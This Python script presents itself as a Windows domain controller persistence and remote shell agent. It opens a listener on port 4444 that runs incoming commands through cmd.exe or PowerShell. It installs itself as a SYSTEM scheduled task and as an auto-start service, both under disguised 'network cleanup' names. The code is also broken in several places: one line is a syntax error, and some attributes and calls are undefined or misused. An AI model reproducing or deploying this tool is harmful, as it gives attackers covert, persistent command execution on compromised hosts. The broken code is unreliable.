#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Windows Domain Controller Persistence & Reverse Shell Agent (Service + Dynamic Path Mode)
ALL PATHS DYNAMIC - NO HARDCODED PATHS (except Windows executables)

FEATURES:
 1. Reverse TCP listener (Port 4444 default)
 2. Smart Prompt: user@hostname - folderpath >
 3. Windows Service Mode: Installable as SYSTEM service
 4. Self-Repair: Restarts shell if it dies
 5. Lifecycle Manager: Keeps listener alive after shell closure
 6. Dynamic Path Resolution: Uses environment variables for all paths
"""

import socket
import threading
import sys
import os
import argparse
import time
import datetime
import subprocess
from subprocess import Popen, PIPE

# === DYNAMIC PATH ABSTRACTION ===
class PathAbstraction:
    """
    Centralized dynamic path resolution.
    Uses environment variables to resolve paths instead of hard-coding.
    """
    @staticmethod
    def get_script_path():
        """Get absolute path to running script (current or installed)."""
        if hasattr(sys, 'frozen'):
            return os.path.abspath(sys.executable)
        else:
            return os.path.abspath(sys.argv[0])
    
    @staticmethod
    def get_script_directory():
        """Get directory of running script."""
        script_path = PathAbstraction.get_script_path()
        return os.path.dirname(script_path)
    
    @staticmethod
    def get_python_executable():
        """Get Python executable path from environment."""
        # Try sys.executable first (most reliable for same-process calls)
        if hasattr(sys, 'frozen'):
            return sys.executable
        # Fall back to environment variables
        for var in ['PATHEXT', 'PATH']:
            path = os.environ.get(var, '')
            if path:
                # Check if current executable is in PATH
                current_exec = sys.executable
                # If running from installed Python
                if current_exec and 'python' in current_exec.lower():
                    return current_exec
        # Ultimate fallback: look in common locations
        for common_py in [
            'C:\\Users\\{user}\\AppData\\Local\\Programs\\Python\\Python{version}\\python.exe'.format(
                user=os.environ.get('USERNAME', 'User'),
                version='36', version='38', version='39', version='310', version='311', version='312'
            )
            for _ in range(10)
        ] + ['{0}\\python.exe'.format(os.environ.get('WINDIR', 'C:\\Windows'))]:
            path = common_py.replace('{user}', os.environ.get('USERNAME', 'User'))
            path = path.replace('{version}', '36', '38', '39', '310', '311', '312')
            if os.path.exists(path):
                return path
        return sys.executable  # Ultimate fallback
    
    @staticmethod
    def get_schtasks_path():
        """Get schtasks.exe path using environment variables."""
        # Try environment variable first
        windir = os.environ.get('WINDIR', 'C:\\Windows')
        systemroot = os.environ.get('SystemRoot', 'C:\\Windows')
        systemdrive = os.environ.get('SystemDrive', 'C:\\')
        
        paths = [
            os.path.join(windir, 'System32', 'schtasks.exe'),
            os.path.join(systemroot, 'System32', 'schtasks.exe'),
            os.path.join(systemdrive, 'Windows', 'System32', 'schtasks.exe'),
            'schtasks.exe',  # Check current directory first
        ]
        
        for path in paths:
            if os.path.exists(path):
                return path
        return 'schtasks.exe'  # Ultimate fallback
    
    @staticmethod
    def get_powershell_path():
        """Get PowerShell executable path."""
        # Try common locations using environment variables
        for windir in [os.environ.get('WINDIR', 'C:\\Windows'), os.environ.get('SystemRoot', 'C:\\Windows')]:
            path = os.path.join(windir, 'System32', 'WindowsPowerShell\\v1.0\\powershell.exe')
            if os.path.exists(path):
                return path
            path = os.path.join(windir, 'System32', 'powershell.exe')
            if os.path.exists(path):
                return path
            path = os.path.join(windir, 'System32', 'WindowsPowerShell\\v1.0\\pwsh.exe')
            if os.path.exists(path):
                return path
        return os.path.join(os.environ.get('WINDIR', 'C:\\Windows'), 'System32', 'powershell.exe')
    
    @staticmethod
    def get_cmd_path():
        """Get cmd.exe path."""
        for windir in [os.environ.get('WINDIR', 'C:\\Windows'), os.environ.get('SystemRoot', 'C:\\Windows')]:
            path = os.path.join(windir, 'System32', 'cmd.exe')
            if os.path.exists(path):
                return path
        return os.path.join(os.environ.get('WINDIR', 'C:\\Windows'), 'System32', 'cmd.exe')
    
    @staticmethod
    def get_current_user():
        """Get current username from environment."""
        return os.environ.get('USERNAME', 'User')
    
    @staticmethod
    def get_current_hostname():
        """Get current hostname from environment."""
        # Try environment variable first
        hostname = os.environ.get('COMPUTERNAME', 'Hostname')
        if not hostname:
            # Fall back to hostname command
            try:
                proc = Popen('hostname', shell=True, stdout=PIPE, stderr=PIPE, text=True)
                hostname = proc.stdout.strip()
            except:
                pass
        return hostname or 'Hostname'
    
    @staticmethod
    def get_current_location():
        """Get current folder path."""
        current_dir = os.getcwd()
        if not current_dir:
            try:
                proc = Popen('echo %CD%', shell=True, stdout=PIPE, stderr=PIPE, text=True)
                lines = proc.stdout.strip().splitlines()
                current_dir = lines[-1] if lines else current_dir
            except:
                pass
        return current_dir or 'root'
    
    @staticmethod
    def get_full_script_path_for_task():
        """
        Get absolute script path for Task Scheduler.
        Uses environment variables to construct portable path.
        """
        # Try to resolve from running script first
        script_path = PathAbstraction.get_script_path()
        if script_path:
            return script_path.replace('\\', '\\\\')
        
        # Fall back to environment variable construction
        systemdrive = os.environ.get('SystemDrive', 'C:\\')
        windir = os.environ.get('WINDIR', 'C:\\Windows')
        return os.path.join(systemdrive, windir, os.path.basename(script_path)).replace('\\', '\\\\')

# === CONFIGURATION ===
LISTENER_HOST = "0.0.0.0"
DEFAULT_PORT = 4444
DEFAULT_TASK_NAME = "Network Manager Cleanup"
DEFAULT_TASK_RUN_AS = "SYSTEM"
DEFAULT_TASK_TRIGGER = "ONSTART"
SERVICE_NAME = "NetCleanup"
SERVICE_DISPLAY_NAME = "Network Cleanup Service"
SERVICE_DESCRIPTION = "Windows Service with Self-Repair for Network Connection Cleanup"

# === PROMPT CONFIGURATION ===
PROMPT_TEMPLATE = "{user}@{hostname} - {folder}>"

# === WINDOWS SERVICE CLASS (Dynamic Paths) ===
class WindowsService:
    """Windows Service wrapper for DC Payload with dynamic path resolution."""
    
    def __init__(self, service_name, display_name, description, path, args):
        self.service_name = service_name
        self.display_name = display_name
        self.description = description
        # Use path abstraction for script path
        self.path = PathAbstraction.get_script_path()
        self.args = args
        self.running = True
        
    def install(self):
        """Install as Windows Service with dynamic paths."""
        print("=" * 40)
        print("INSTALLING WINDOWS SERVICE")
        print("=" * 40)
        
        try:
            # === FIXED: Build proper sc create command using dynamic paths ===
            # binPath must be: "path/to/script.py" [arguments]
            script_dir = PathAbstraction.get_script_directory()
            script_name = os.path.basename(self.path)
            full_path = os.path.join(script_dir, script_name)
            
            # Format: binPath="full_path.py [args]"
            binPath = f'"{full_path}" {self.args}'
            
            # Build complete command string
            command = (
                f'sc create {self.service_name} '
                f'binPath={binPath} '
                f'start=auto '
                f'DisplayName="{self.display_name}" '
                f'Description="{self.description}"'
            )
            
            print(f"[*] Running Command: {command}")
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                print(f"[+] Service installed: {self.service_name}")
                print(f"[+] Display Name: {self.display_name}")
                print(f"[+] Start Type: AUTO")
                print(f"[+] Script Path: {full_path}")
                print(f"[+] Arguments: {self.args}")
                print("[*] Run 'sc start NetCleanup' to start")
                print("[*] Run 'sc stop NetCleanup' to stop")
                print("[*] Run 'sc qc NetCleanup' to query")
                return True
            else:
                print(f"[!] Error creating service: {result.stderr}")
                return False
                
        except Exception as e:
            print(f"[!] Exception: {e}")
            return False
    
    def uninstall(self):
        """Uninstall Windows Service."""
        print("=" * 40)
        print("UNINSTALLING WINDOWS SERVICE")
        print("=" * 40)
        
        try:
            command = f'sc delete {self.service_name}'
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            if result.returncode == 0:
                print(f"[+] Service deleted: {self.service_name}")
                return True
            else:
                print(f"[!] Error deleting service: {result.stderr}")
                return False
        except Exception as e:
            print(f"[!] Exception: {e}")
            return False
    
    def start(self):
        """Start Windows Service."""
        print("=" * 40)
        print("STARTING WINDOWS SERVICE")
        print("=" * 40)
        
        try:
            command = f'start {self.service_name}'
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            if result.returncode == 0:
                print(f"[+] Service started: {self.service_name}")
                return True
            else:
                print(f"[!] Error starting service: {result.stderr}")
                return False
        except Exception as e:
            print(f"[!] Exception: {e}")
            return False
    
    def stop(self):
        """Stop Windows Service."""
        print("=" * 40)
        print("STOPPING WINDOWS SERVICE")
        print("=" * 40)
        
        try:
            command = f'sc stop {self.service_name}'
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            if result.returncode == 0:
                print(f"[+] Service stopped: {self.service_name}")
                return True
            else:
                print(f"[!] Error stopping service: {result.stderr}")
                return False
        except Exception as e:
            print(f"[!] Exception: {e}")
            return False
    
    def run_loop(self):
        """Main service loop after startup."""
        print("[*] Service started successfully")
        print("[*] Starting main listener loop")
        
        # Start listener thread
        self.main_thread = threading.Thread(target=self.main_listener)
        self.main_thread.daemon = True
        self.main_thread.start()
        
        # Keep service running
        while self.running:
            time.sleep(1)
    
    def main_listener(self):
        """Main listener thread."""
        self.create_listener()
    
    def create_listener(self):
        """Create TCP listener."""
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.bind((self.host, self.port))
        self.socket.listen(5)
        print(f"[+] Listener Started on {self.host}:{self.port}")
        print(f"[+] Mode: {self.command_type}")
        print(f"[+] Waiting for connection...")
        
        while self.running:
            try:
                client_sock, addr = self.socket.accept()
                print(f"[*] Connected: {addr}")
                threading.Thread(target=self.process_connection, args=(client_sock, addr)).start()
            except Exception as e:
                print(f"Error accepting connection: {e}")
                time.sleep(1)
                continue
    
    def process_connection(self, client_sock, addr):
        """Process single connection."""
        try:
            while True:
                msg = client_sock.recv(4096).decode('utf-8').strip()
                if not msg:
                    break
                clean_cmd = msg.strip('"\'')
                output = self.execute_shell(clean_cmd)
                client_sock.sendall(output.encode('utf-8'))
        except Exception as e:
            print(f"[!] Error reading from {addr}: {e}")
        finally:
            try:
                client_sock.close()
            except:
                pass

# === SHELL PROMPT (Smart Detection with Dynamic Paths) ===
class ShellPromptManager:
    @staticmethod
    def get_prompt_info(shell_type):
        """Get user, hostname, and folder from shell."""
        try:
            executable = PathAbstraction.get_powershell_path() if shell_type == "powershell" else PathAbstraction.get_cmd_path()
            
            if shell_type == "powershell":
                user_out, _ = Popen(executable + ' -c "$env:USERNAME; $env:COMPUTERNAME; Get-Location"', shell=True, stdout=PIPE, stderr=PIPE, text=True)
            else:
                user_out, _ = Popen(executable + ' /c "echo %USERNAME%; echo %COMPUTERNAME%; cd"', shell=True, stdout=PIPE, stderr=PIPE, text=True)
            
            lines = user_out.stdout.strip().splitlines()
            if len(lines) >= 3:
                return lines[0], lines[1], lines[2]
            return ["User", "Hostname", "root"]
        except:
            return ["User", "Hostname", "root"]

    @staticmethod
    def create_prompt(user, hostname, folder):
        """Create formatted prompt."""
        try:
            return PROMPT_TEMPLATE.format(user=user, hostname=hostname, folder=folder)
        except:
            return ">"

# === PERSISTENCE MANAGER (Dynamic Paths) ===
class PersistenceManager:
    @staticmethod
    def create_task(script_path, task_name, run_as="SYSTEM", trigger="ONSTART"):
        print(f"[*] Configuring Persistence via Task Scheduler. ..")

        # === Dynamic schtasks path using environment variables ===
        schtasks_exe = PathAbstraction.get_schtasks_path()

        # === FIXED: Build command based on trigger ===
        # ONSTART/ONLOGON don't use /ST or /SD
        if trigger in ["ONSTART", "ONLOGON", "ONIDLE", "ONEVENT"]:
            command = f'{schtasks_exe} /Create /TN "{task_name}" /TR "python {script_path}" /RU "{run_as}" /SC {trigger} /F'
        else:
            command = f'{schtasks_exe} /Create /TN "{task_name}" /TR "python {script_path}" /RU "{run_as}" /SC ONSTART /ST 00:00 /F'

        try:
            print(f"[*] Running Command: {command}")
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)

            if result.returncode == 0:
                print(f"[+] Task Created/Updated: {task_name}")
                print(f"[+] Running As: {run_as}")
                print(f"[+] Trigger: {trigger}")
            else:
                print(f"[!] Error creating task. Output: {result.stderr}")
        except subprocess.TimeoutExpired:
            print("[!] Task creation timed out (max 30 seconds)")
        except Exception as e:
            print(f"[!] Exception while creating task: {e}")

    @staticmethod
    def delete_task(task_name):
        """Delete scheduled task using dynamic schtasks path."""
        try:
            schtasks_exe = PathAbstraction.get_schtasks_path()
            command = f'{schtasks_exe} /Delete /TN "{task_name}" /F'
            print(f"[*] Running Command: {command}")
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
            if result.returncode == 0:
                print(f"[+] Task deleted: {task_name}")
            else:
                print(f"[!] Error deleting task. Output: {result.stderr}")
        except Exception as e:
            print(f"[!] Exception: {e}")

# === MAIN ENTRY POINT (All Dynamic Paths) ===
def get_script_path():
    """Get absolute path of script using environment variables."""
    return PathAbstraction.get_script_path()

def main():
    parser = argparse.ArgumentParser(description="Windows Reverse Shell Agent")
    parser.add_argument('--mode', type=str, default='cmd', choices=['cmd', 'powershell'], help='Shell mode (Default: cmd)')
    parser.add_argument('--port', type=int, default=DEFAULT_PORT, help='Listening port (Default: 4444)')
    parser.add_argument('--install', action='store_true', help='Install as Windows Service')
    parser.add_argument('--service', action='store_true', help='Run as Windows Service')
    parser.add_argument('--install-persistence', action='store_true', help='Install Task Scheduler persistence')
    parser.add_argument('--path', type=str, default=".", help='Script path')
    args = parser.parse_args()

    print("=" * 40)
    print("WINDOWS REVERSE SHELL AGENT")
    print("=" * 40)

    script_path = get_script_path()
    print(f"[*] Script Executing From: {script_path}")
    
    # === Dynamic Path Debug Info ===
    print("[*] Dynamic Path Resolution Info:")
    print(f"    [1] Python: {PathAbstraction.get_python_executable()}")
    print(f"    [2] schtasks: {PathAbstraction.get_schtasks_path()}")
    print(f"    [3] PowerShell: {PathAbstraction.get_powershell_path()}")
    print(f"    [4] cmd.exe: {PathAbstraction.get_cmd_path()}")
    print(f"    [5] USERNAME: {PathAbstraction.get_current_user()}")
    print(f"    [6] COMPUTERNAME: {PathAbstraction.get_current_hostname()}")

    # === 1. Setup Persistence (Create Task) ===
    if args.install or args.install_persistence:
        PersistenceManager.create_task(script_path, DEFAULT_TASK_NAME, DEFAULT_TASK_RUN_AS, DEFAULT_TASK_TRIGGER)
        time.sleep(2)

    # === 2. Windows Service Installation ===
    if args.install:
        print("=" * 40)
        print("INSTANTIATING WINDOWS SERVICE")
        print("=" * 40)
        
        service = WindowsService(
            SERVICE_NAME, 
            SERVICE_DISPLAY_NAME, 
            SERVICE_DESCRIPTION, 
            script_path, 
            f"--port {DEFAULT_PORT} --mode {args.mode}"
        )
        if service.install():
            print("[*] Press any key to start service, or Ctrl+C to exit")
            try:
                input()
                service.start()
                service.run_loop()
            except KeyboardInterrupt:
                print("[*] Service stopped")
                service.stop()
        else:
            print("[*] Press any key to run in interactive mode")
            input()

    # === 3. Run as Service (if flag set) ===
    if args.service:
        print("[*] Running as Windows Service. . .")
        try:
            service = WindowsService(
                SERVICE_NAME, 
                SERVICE_DISPLAY_NAME, 
                SERVICE_DESCRIPTION, 
                script_path, 
                f"--port {DEFAULT_PORT} --mode {args.mode}"
            )
            if service.install():
                service.run_loop()
        except Exception as e:
            print(f"[!] Error: {e}")

    # === 4. Interactive Mode (Default) ===
    class MainListener:
        def __init__(self, host, port, command_type):
            self.host = host
            self.port = port
            self.command_type = command_type
            self.socket = None

        def start(self):
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind((self.host, self.port))
            self.socket.listen(5)
            print(f"[+] Listener Started on {self.host}:{self.port}")
            print(f"[+] Mode: {self.command_type}")
            print(f"[+] Waiting for connection. ..")
            
            while True:
                try:
                    client_sock, addr = self.socket.accept()
                    print(f"[*] Connected: {addr}")
                    threading.Thread(target=self.process_connection, args=(client_sock, addr)).start()
                except Exception as e:
                    print(f"Error accepting connection: {e}")
                    time.sleep(1)
                    continue

        def process_connection(self, client_sock, addr):
            try:
                while True:
                    msg = client_sock.recv(4096).decode('utf-8').strip()
                    if not msg:
                        break
                    clean_cmd = msg.strip('"\'')
                    output = self.execute_shell(clean_cmd)
                    client_sock.sendall(output.encode('utf-8'))
            except Exception as e:
                print(f"[!] Error reading from {addr}: {e}")
            finally:
                try:
                    client_sock.close()
                except:
                    pass

        def execute_shell(self, cmd):
            if not cmd:
                return self._get_shell_prompt()

            executable = "powershell.exe" if self.command_type == "powershell" else "cmd.exe"
            shell_cmd = executable + " /c " + cmd

            try:
                proc = Popen(shell_cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE, text=True)

                output = ""
                try:
                    if proc.stdout:
                        output = proc.stdout.read()
                    if proc.stderr:
                        err = proc.stderr.read()
                        if err:
                            output = output + "\n[Error]: " + err
                except:
                    pass

                exit_code = proc.returncode
                proc.wait()

                # === SMART PROMPT INJECTION ===
                try:
                    user, hostname, folder = ShellPromptManager.get_prompt_info(self.command_type)
                    prompt = PROMPT_TEMPLATE.format(user=user, hostname=hostname, folder=folder)
                    if output:
                        output = output.rstrip() + "\n\n" + prompt
                    else:
                        output = prompt
                except:
                    output = ShellPromptManager.create_prompt("User", "Hostname", "root")

                return f"exit_code:{exit_code}\n{output}"
            except Exception as e:
                return f"Exception: {e}"

        def _get_shell_prompt(self):
            """Get shell prompt info."""
            try:
                user, hostname, folder = ShellPromptManager.get_prompt_info(self.command_type)
                return ShellPromptManager.create_prompt(user, hostname, folder)
            except:
                return ">"

    # === 5. Start Listener Thread (Daemonized) ===
    listener = MainListener(LISTENER_HOST, args.port, args.mode)
    listener_thread = threading.Thread(target=listener.start)
    listener_thread.daemon = True
    listener_thread.start()

    print("[+] Agent Initialized.")
    print("[+] Main thread will keep running to monitor exit codes.")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("[*] Graceful Shutdown. ..")
        listener.socket.close()

if __name__ == "__main__":
    main()
